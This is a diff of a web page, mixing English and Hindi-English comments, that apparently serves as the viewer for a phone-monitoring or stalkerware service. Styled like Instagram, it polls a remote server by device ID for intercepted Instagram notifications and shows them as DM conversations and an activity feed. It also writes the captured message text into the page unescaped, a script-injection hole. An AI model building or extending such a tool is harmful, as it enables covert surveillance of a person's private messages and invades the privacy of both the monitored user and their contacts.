@@ -2,309 +2,471 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Instagram DM Monitor</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Log</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- INSTAGRAM DARK THEME --- */
-        body { 
-            margin: 0; 
-            background-color: #000; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            color: #fff; 
-            height: 100vh; 
-            overflow: hidden; 
+        /* --- INSTAGRAM DARK THEME VARS --- */
+        :root {
+            --bg-color: #000000;
+            --text-primary: #f5f5f5;
+            --text-secondary: #a8a8a8;
+            --border-color: #262626;
+            --blue-accent: #0095f6;
+            --input-bg: #262626;
+            --incoming-bubble: #262626;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            height: 100vh;
             display: flex;
             justify-content: center;
+            overflow: hidden;
         }
 
+        /* --- MOBILE CONTAINER --- */
         .app-container {
             width: 100%;
+            max-width: 500px; /* Mobile width constraint */
             height: 100%;
-            max-width: 450px;
-            background-color: #000;
-            position: relative;
             display: flex;
             flex-direction: column;
+            border-left: 1px solid var(--border-color);
+            border-right: 1px solid var(--border-color);
+            position: relative;
         }
 
-        /* --- VIEW 1: DM LIST --- */
-        #dmListView { display: flex; flex-direction: column; height: 100%; width: 100%; }
-
-        .dm-header { 
-            padding: 15px; display: flex; justify-content: space-between; align-items: center; height: 40px;
+        /* --- HEADER --- */
+        .header {
+            height: 60px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 16px;
+            border-bottom: 1px solid var(--border-color);
+            z-index: 10;
+            background: var(--bg-color);
         }
-        .username-top { font-weight: bold; font-size: 1.2rem; display: flex; align-items: center; gap: 5px; cursor: pointer; }
-        .header-icons { display: flex; gap: 20px; font-size: 1.4rem; }
+
+        .header-title { font-size: 20px; font-weight: 700; display: flex; align-items: center; gap: 5px; }
+        .header-icons { font-size: 24px; display: flex; gap: 20px; }
+
+        /* --- TABS (INBOX vs ACTIVITY) --- */
+        .bottom-nav {
+            height: 50px;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            background: var(--bg-color);
+            font-size: 24px;
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            z-index: 20;
+        }
+
+        .nav-item { cursor: pointer; color: var(--text-secondary); transition: 0.2s; position: relative; }
+        .nav-item.active { color: var(--text-primary); }
+        .badge { position: absolute; top: -2px; right: -2px; background: #ff3040; width: 8px; height: 8px; border-radius: 50%; display: none; }
+
+        /* --- PAGES --- */
+        .page {
+            flex: 1;
+            overflow-y: auto;
+            display: none; /* Hidden by default */
+            padding-bottom: 60px; /* Space for bottom nav */
+        }
+        .page.active-page { display: block; }
+
+        /* --- 1. INBOX LIST STYLES --- */
+        .dm-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            cursor: pointer;
+        }
+        .dm-item:active { background-color: #121212; }
+
+        .avatar {
+            width: 50px; height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            padding: 2px; /* Ring effect */
+            flex-shrink: 0;
+            margin-right: 14px;
+        }
+        .avatar-img {
+            width: 100%; height: 100%;
+            background: #000;
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 20px; font-weight: bold; color: #fff; border: 2px solid #000;
+        }
+
+        .dm-content { flex: 1; overflow: hidden; }
+        .dm-name { font-size: 14px; color: var(--text-primary); font-weight: 400; margin-bottom: 2px; }
+        .dm-preview { font-size: 13px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .dm-time { font-size: 12px; color: var(--text-secondary); margin-left: 10px; }
+
+        /* --- 2. ACTIVITY (LIKES/COMMENTS) STYLES --- */
+        .activity-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .act-icon { font-size: 24px; margin-right: 15px; width: 30px; text-align: center; }
+        .icon-heart { color: #ff3040; }
+        .icon-comment { color: #0095f6; }
+        .icon-follow { color: #8e44ad; }
         
-        .search-box { padding: 0 15px 10px 15px; }
-        .search-input { width: 100%; background: #262626; border: none; padding: 8px 10px; border-radius: 10px; color: #a8a8a8; outline: none; box-sizing: border-box; }
+        .act-text { font-size: 14px; flex: 1; line-height: 1.4; }
+        .act-text strong { font-weight: 600; }
+        .act-time { font-size: 12px; color: var(--text-secondary); display: block; margin-top: 2px; }
 
-        .dm-list { flex: 1; overflow-y: auto; padding-top: 5px; }
-        
-        .dm-item { 
-            display: flex; align-items: center; padding: 10px 15px; cursor: pointer; transition: 0.2s; 
+        /* --- 3. CHAT WINDOW (FULL SCREEN) --- */
+        .chat-window {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: black; z-index: 50;
+            display: none; flex-direction: column;
         }
-        .dm-item:active { background: #1a1a1a; }
+        .chat-window.open { display: flex; }
 
-        .insta-dp { width: 54px; height: 54px; border-radius: 50%; background: #333; margin-right: 15px; overflow: hidden; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; color: #888; border: 1px solid #333; }
+        .chat-header {
+            height: 60px; padding: 0 16px;
+            display: flex; align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            background: black;
+        }
+        .back-btn { font-size: 22px; margin-right: 20px; cursor: pointer; }
         
-        .dm-info { flex: 1; }
-        .dm-info h4 { margin: 0; font-weight: 400; font-size: 0.95rem; color: #fff; }
-        .dm-info p { margin: 3px 0 0; color: #a8a8a8; font-size: 0.85rem; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden;}
-        .time-badge { font-size: 0.7rem; color: #666; margin-left: 5px; }
-
-        .camera-icon { margin-left: auto; color: #a8a8a8; font-size: 1.4rem; }
-
-        /* --- VIEW 2: CHAT DETAIL --- */
-        #chatView { 
-            display: none; 
-            flex-direction: column; height: 100%; 
-            background: #000; 
-            position: absolute; top: 0; left: 0; width: 100%; 
-            z-index: 20; 
+        .chat-messages {
+            flex: 1; padding: 20px;
+            overflow-y: auto; display: flex; flex-direction: column; gap: 8px;
         }
 
-        .chat-nav { 
-            padding: 10px 15px; display: flex; align-items: center; 
-            border-bottom: 1px solid #262626; height: 40px;
+        .msg-bubble {
+            max-width: 75%;
+            padding: 10px 14px;
+            border-radius: 22px;
+            font-size: 14px;
+            line-height: 1.4;
+            background: var(--incoming-bubble);
+            color: var(--text-primary);
+            align-self: flex-start;
+            position: relative;
         }
         
-        .chat-area { 
-            flex: 1; padding: 15px; overflow-y: auto; 
-            display: flex; flex-direction: column; gap: 4px; 
-        }
-        
-        .msg { padding: 10px 16px; border-radius: 22px; max-width: 70%; font-size: 0.95rem; margin-bottom: 2px; line-height: 1.4; word-wrap: break-word;}
-        
-        .msg-in { 
-            background: #262626; align-self: flex-start; color: #fff; border-bottom-left-radius: 5px;
-        }
-        .msg-time { font-size: 0.65rem; color: #888; display: block; margin-top: 5px; text-align: right;}
+        .msg-time { font-size: 10px; color: #777; margin-top: 4px; display: block; }
 
-        .chat-input { padding: 15px; display: flex; align-items: center; gap: 15px; }
-        .pill { flex: 1; background: #262626; padding: 12px 20px; border-radius: 25px; color: #fff; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
-
+        /* Loading */
+        .loading { text-align: center; margin-top: 50px; color: #555; }
     </style>
 </head>
 <body>
 
     <div class="app-container">
-
-        <div id="dmListView">
-            <div class="dm-header">
-                <div class="username-top" onclick="window.location.href='index.html'">
-                    <i class="fa-solid fa-arrow-left"></i>
-                    <span style="margin-left:10px">Instagram Direct</span> 
-                </div>
-                <div class="header-icons">
-                    <i class="fa-solid fa-video"></i>
-                    <i class="fa-regular fa-pen-to-square"></i>
-                </div>
-            </div>
-            
-            <div class="search-box">
-                <input type="text" class="search-input" placeholder="Search">
-            </div>
-
-            <div class="dm-list" id="instaList">
-                <div style="display:flex; justify-content:center; align-items:center; height:200px; color:#555;">
-                    <i class="fa-solid fa-spinner fa-spin" style="font-size:20px; margin-right:10px;"></i> Loading...
-                </div>
+        
+        <div class="header" id="mainHeader">
+            <div class="header-title" id="pageTitle">instagram <i class="fas fa-chevron-down" style="font-size: 12px;"></i></div>
+            <div class="header-icons">
+                <i class="far fa-plus-square"></i>
+                <i class="fas fa-sync-alt" onclick="manualRefresh()" style="font-size: 18px;"></i>
             </div>
         </div>
 
-        <div id="chatView">
-            <div class="chat-nav">
-                <i class="fa-solid fa-arrow-left" style="font-size:1.5rem; margin-right:20px; cursor:pointer;" onclick="closeInstaChat()"></i>
-                <div class="insta-dp" style="width:30px; height:30px; margin-right:10px; font-size: 1rem;">
-                    <i class="fa-solid fa-user"></i>
-                </div>
-                <div style="flex:1;">
-                    <div style="font-weight:600; font-size: 0.95rem;" id="instaChatName">User</div>
-                    <div style="font-size: 0.75rem; color: #a8a8a8;">Active today</div>
-                </div>
-                <i class="fa-solid fa-phone" style="font-size:1.4rem; margin-right:20px"></i>
-                <i class="fa-solid fa-video" style="font-size:1.4rem"></i>
+        <div id="page-inbox" class="page active-page">
+            <div style="padding: 10px 16px;">
+                <input type="text" placeholder="Search" style="width:100%; background: #262626; border:none; padding:8px 15px; border-radius: 10px; color:white; outline:none;">
             </div>
-            
-            <div class="chat-area" id="instaMsgs">
+            <div style="padding: 0 16px; margin-bottom: 10px; font-weight: 600; font-size: 15px;">Messages</div>
+            <div id="dmList">
+                <div class="loading">Loading Chats...</div>
             </div>
-            
-            <div class="chat-input">
-                <div class="pill">
-                    <span style="color:#ddd">Message...</span>
-                    <i class="fa-regular fa-image" style="color:#fff"></i>
+        </div>
+
+        <div id="page-activity" class="page">
+            <div style="padding: 15px 16px; font-weight: 700; font-size: 20px;">Activity</div>
+            <div id="activityList">
+                <div class="loading">No recent activity</div>
+            </div>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-item active" onclick="switchTab('inbox', this)">
+                <i class="fab fa-facebook-messenger"></i>
+            </div>
+            <div class="nav-item" onclick="switchTab('activity', this)">
+                <i class="far fa-heart"></i>
+                <div class="badge" id="activityBadge"></div>
+            </div>
+            <div class="nav-item">
+                <div style="width:24px; height:24px; background:grey; border-radius:50%;"></div>
+            </div>
+        </div>
+
+        <div class="chat-window" id="chatWindow">
+            <div class="chat-header">
+                <i class="fas fa-arrow-left back-btn" onclick="closeChat()"></i>
+                <div class="avatar" style="width:30px; height:30px; margin-right:10px;">
+                    <div class="avatar-img" id="chatAvatar" style="font-size: 14px;">?</div>
                 </div>
+                <div style="font-weight: 600; font-size: 16px;" id="chatName">Username</div>
             </div>
+            <div class="chat-messages" id="chatMessages">
+                </div>
         </div>
 
     </div>
 
     <script>
         // --- CONFIG ---
-        const DEVICE_ID = localStorage.getItem('monitoring_id');
-        const BASE_URL = "https://child-v9no.onrender.com/api/get-data"; 
-        
-        // 🔥 UPDATE: Specifically requesting 'instagram' file
-        const DATA_TYPE = "instagram";
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('id');
+        const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
+        const STORAGE_KEY = `instagram_data_${deviceId || 'default'}`;
 
-        if (!DEVICE_ID) {
-            alert("Device ID Missing!");
-            window.location.href = 'index.html'; 
+        // --- STATE ---
+        let rawData = [];
+        let groupedChats = {};   // For DMs
+        let activityLogs = [];   // For Likes/Comments
+        let activeChatUser = null;
+
+        // --- 1. KEYWORD FILTER LOGIC ---
+        // Ye keywords decide karenge ki notification 'Chat' hai ya 'Activity'
+        const ACTIVITY_KEYWORDS = [
+            "liked your", "liked a message", "commented:", "started following", 
+            "mentioned you", "tagged you", "replied to your"
+        ];
+
+        // --- 2. INITIALIZATION ---
+        function init() {
+            // Load from LocalStorage immediately
+            const saved = localStorage.getItem(STORAGE_KEY);
+            if (saved) {
+                const parsed = JSON.parse(saved);
+                groupedChats = parsed.chats || {};
+                activityLogs = parsed.activity || [];
+                renderInbox();
+                renderActivity();
+            }
+            fetchData();
+            setInterval(fetchData, 4000); // Auto refresh
         }
 
-        let groupedInsta = {}; 
-
-        // --- 1. FETCH DATA ---
-        async function fetchInstaData() {
+        // --- 3. FETCH & PROCESS ---
+        async function fetchData() {
+            if (!deviceId) return;
             try {
-                // REST API Call: /api/get-data/ID/instagram
-                const finalUrl = `${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}`;
+                const res = await fetch(API_URL);
+                const data = await res.json();
                 
-                const response = await fetch(finalUrl);
-                const result = await response.json();
+                // Filter only Instagram
+                const instaData = data.filter(d => 
+                    (d.packageName || "").includes("instagram") || 
+                    (d.appName || "").toLowerCase().includes("instagram")
+                );
 
-                if (Array.isArray(result) && result.length > 0) {
-                    processInstaData(result);
+                processData(instaData);
+            } catch (e) { console.error("Fetch Error", e); }
+        }
+
+        function processData(data) {
+            let tempChats = {};
+            let tempActivity = [];
+
+            data.forEach(item => {
+                const text = (item.text || "").toLowerCase();
+                const title = item.title || "Instagram User";
+                
+                // Check if it's an Activity (Like/Comment)
+                const isActivity = ACTIVITY_KEYWORDS.some(key => text.includes(key));
+
+                if (isActivity) {
+                    tempActivity.push(item);
                 } else {
-                    document.getElementById('instaList').innerHTML = "<p style='text-align:center; color:#444; margin-top:20px'>No Instagram Data Yet</p>";
+                    // Treat as Direct Message
+                    if (!tempChats[title]) tempChats[title] = [];
+                    tempChats[title].push(item);
                 }
-            } catch (error) {
-                console.error("Fetch Error:", error);
+            });
+
+            // Save & Update State
+            groupedChats = tempChats;
+            activityLogs = tempActivity;
+
+            // Sort Activity (Newest First)
+            activityLogs.sort((a,b) => b.postTime - a.postTime);
+
+            localStorage.setItem(STORAGE_KEY, JSON.stringify({
+                chats: groupedChats,
+                activity: activityLogs
+            }));
+
+            // Re-render Views
+            renderInbox();
+            renderActivity();
+            
+            // If chat is open, refresh it
+            if (activeChatUser) {
+                renderChatMessages(activeChatUser);
             }
         }
 
-        // --- 2. INTELLIGENT PROCESSING ---
-        function processInstaData(logs) {
-            groupedInsta = {}; 
-            
-            // Step A: Logs ko Time ke hisab se sort karo (Oldest First for chat history)
-            logs.sort((a, b) => (a.time || 0) - (b.time || 0));
+        // --- 4. RENDER INBOX (Chats) ---
+        function renderInbox() {
+            const list = document.getElementById('dmList');
+            list.innerHTML = "";
 
-            logs.forEach(log => {
-                let rawTitle = (log.title || "").trim();
-                let rawText = (log.text || "").trim();
-                let time = log.time || Date.now();
-
-                // --- GARBAGE FILTER ---
-                if (rawText.includes("checking for new messages") || rawText.includes("running")) return;
-
-                let senderName = "Unknown";
-                let messageBody = rawText;
-
-                // --- LOGIC: IDENTIFY SENDER ---
-                // Case 1: Title is "Instagram" -> Usually a system notification or hidden sender
-                if (rawTitle === "Instagram") {
-                    if (rawText.includes(":")) {
-                        // Ex: "John: Hello" -> Sender: John, Msg: Hello
-                        let parts = rawText.split(":");
-                        senderName = parts[0].trim();
-                        messageBody = parts.slice(1).join(":").trim();
-                    } else {
-                        // Ex: "3 new messages" -> System Notification
-                        senderName = "System Notifications";
-                    }
-                } 
-                // Case 2: Title is the User Name (Standard DM)
-                else {
-                    senderName = rawTitle;
-                }
-
-                // --- GROUPING ---
-                if (!groupedInsta[senderName]) {
-                    groupedInsta[senderName] = {
-                        name: senderName,
-                        lastMsg: "",
-                        lastTime: 0,
-                        msgs: []
-                    };
-                }
-
-                // Add to list
-                groupedInsta[senderName].msgs.push({
-                    text: messageBody,
-                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
-                    rawTime: time
-                });
-
-                // Update Preview
-                groupedInsta[senderName].lastMsg = messageBody;
-                groupedInsta[senderName].lastTime = time;
+            const sortedUsers = Object.keys(groupedChats).sort((a,b) => {
+                const lastA = groupedChats[a][groupedChats[a].length-1].postTime;
+                const lastB = groupedChats[b][groupedChats[b].length-1].postTime;
+                return lastB - lastA;
             });
 
-            renderInstaList();
-        }
-
-        // --- 3. RENDER LIST ---
-        function renderInstaList() {
-            const list = document.getElementById('instaList');
-            const userNames = Object.keys(groupedInsta);
-
-            if(userNames.length === 0) {
-                list.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No Chats Found</p>";
+            if (sortedUsers.length === 0) {
+                list.innerHTML = `<div class="loading">No messages yet.</div>`;
                 return;
             }
 
-            // SORTING: Jiski chat abhi aayi hai wo sabse upar (Newest LastTime First)
-            userNames.sort((a, b) => groupedInsta[b].lastTime - groupedInsta[a].lastTime);
+            sortedUsers.forEach(user => {
+                const msgs = groupedChats[user];
+                const lastMsg = msgs[msgs.length - 1];
+                const timeStr = formatTime(lastMsg.postTime);
 
-            let html = "";
-            userNames.forEach(user => {
-                const u = groupedInsta[user];
-                
-                // Icon selection: System vs User
-                let icon = '<i class="fa-solid fa-user"></i>';
-                if(user === "System Notifications") icon = '<i class="fa-solid fa-bell" style="color:#e1306c"></i>';
-
-                html += `
-                    <div class="dm-item" onclick="openInstaChat('${user}')">
-                        <div class="insta-dp">${icon}</div>
-                        <div class="dm-info">
-                            <div style="display:flex; justify-content:space-between; width:100%">
-                                <h4>${u.name}</h4>
-                                <span class="time-badge">${new Date(u.lastTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
-                            </div>
-                            <p>${u.lastMsg}</p>
+                const div = document.createElement('div');
+                div.className = 'dm-item';
+                div.onclick = () => openChat(user);
+                div.innerHTML = `
+                    <div class="avatar">
+                        <div class="avatar-img">${user.charAt(0).toUpperCase()}</div>
+                    </div>
+                    <div class="dm-content">
+                        <div class="dm-name">${user}</div>
+                        <div class="dm-preview">
+                            ${lastMsg.text} <span class="dm-time">· ${timeStr}</span>
                         </div>
-                        <i class="fa-solid fa-camera camera-icon"></i>
-                    </div>`;
+                    </div>
+                    <i class="far fa-camera" style="font-size:20px; color:#a8a8a8;"></i>
+                `;
+                list.appendChild(div);
             });
-            
-            list.innerHTML = html;
         }
 
-        // --- 4. CHAT VIEW ---
-        function openInstaChat(userName) {
-            const u = groupedInsta[userName];
-            if(!u) return;
-
-            document.getElementById('instaChatName').innerText = u.name;
-            const box = document.getElementById('instaMsgs');
-            box.innerHTML = "";
+        // --- 5. RENDER ACTIVITY (Likes/Comments) ---
+        function renderActivity() {
+            const list = document.getElementById('activityList');
+            const badge = document.getElementById('activityBadge');
             
-            // Messages are already sorted Old -> New in Process function
-            u.msgs.forEach(m => {
-                box.innerHTML += `
-                    <div class="msg msg-in">
-                        ${m.text}
-                        <span class="msg-time">${m.timeStr}</span>
-                    </div>`;
+            list.innerHTML = "";
+            
+            if (activityLogs.length > 0) badge.style.display = 'block';
+            else badge.style.display = 'none';
+
+            if (activityLogs.length === 0) {
+                list.innerHTML = `<div class="loading">No recent notifications</div>`;
+                return;
+            }
+
+            activityLogs.forEach(log => {
+                let iconClass = 'icon-heart fa-heart';
+                let typeText = "liked your post.";
+                
+                const txt = log.text.toLowerCase();
+                if (txt.includes("comment")) { iconClass = 'icon-comment fa-comment'; }
+                else if (txt.includes("follow")) { iconClass = 'icon-follow fa-user-plus'; }
+
+                const div = document.createElement('div');
+                div.className = 'activity-item';
+                div.innerHTML = `
+                    <div class="act-icon">
+                        <i class="fas ${iconClass}"></i>
+                    </div>
+                    <div class="act-text">
+                        <strong>${log.title}</strong> ${log.text}
+                        <span class="act-time">${formatTime(log.postTime)}</span>
+                    </div>
+                `;
+                list.appendChild(div);
+            });
+        }
+
+        // --- 6. CHAT WINDOW LOGIC ---
+        function openChat(user) {
+            activeChatUser = user;
+            document.getElementById('chatWindow').classList.add('open');
+            document.getElementById('chatName').innerText = user;
+            document.getElementById('chatAvatar').innerText = user.charAt(0).toUpperCase();
+            renderChatMessages(user);
+        }
+
+        function closeChat() {
+            activeChatUser = null;
+            document.getElementById('chatWindow').classList.remove('open');
+        }
+
+        function renderChatMessages(user) {
+            const container = document.getElementById('chatMessages');
+            container.innerHTML = "";
+            
+            const msgs = groupedChats[user] || [];
+            // Sort Oldest -> Newest
+            msgs.sort((a, b) => a.postTime - b.postTime);
+
+            let lastTxt = "";
+            msgs.forEach(m => {
+                if(m.text === lastTxt) return; // Dedup
+                lastTxt = m.text;
+
+                const div = document.createElement('div');
+                div.className = 'msg-bubble';
+                div.innerHTML = `
+                    ${m.text}
+                    <span class="msg-time">${formatTime(m.postTime)}</span>
+                `;
+                container.appendChild(div);
             });
 
-            document.getElementById('dmListView').style.display = 'none';
-            document.getElementById('chatView').style.display = 'flex';
-            box.scrollTop = box.scrollHeight;
+            // Scroll to bottom
+            container.scrollTop = container.scrollHeight;
         }
 
-        function closeInstaChat() {
-            document.getElementById('chatView').style.display = 'none';
-            document.getElementById('dmListView').style.display = 'flex';
+        // --- UTILS ---
+        function formatTime(ms) {
+            const date = new Date(parseInt(ms));
+            const now = new Date();
+            if (now.getDate() === date.getDate()) {
+                return date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+            }
+            return date.toLocaleDateString();
         }
 
-        // Auto Refresh
-        fetchInstaData();
-        setInterval(fetchInstaData, 5000);
+        function switchTab(tabName, el) {
+            // Update UI Tabs
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            el.classList.add('active');
+
+            // Switch Pages
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+            document.getElementById(`page-${tabName}`).classList.add('active-page');
+            
+            // Header Title Update
+            const titles = { 'inbox': 'Direct', 'activity': 'Activity' };
+            document.getElementById('pageTitle').innerText = titles[tabName] || 'Instagram';
+        }
+
+        function manualRefresh(){
+            fetchData();
+            alert("Checking for new data...");
+        }
+
+        // START
+        init();
 
     </script>
 </body>
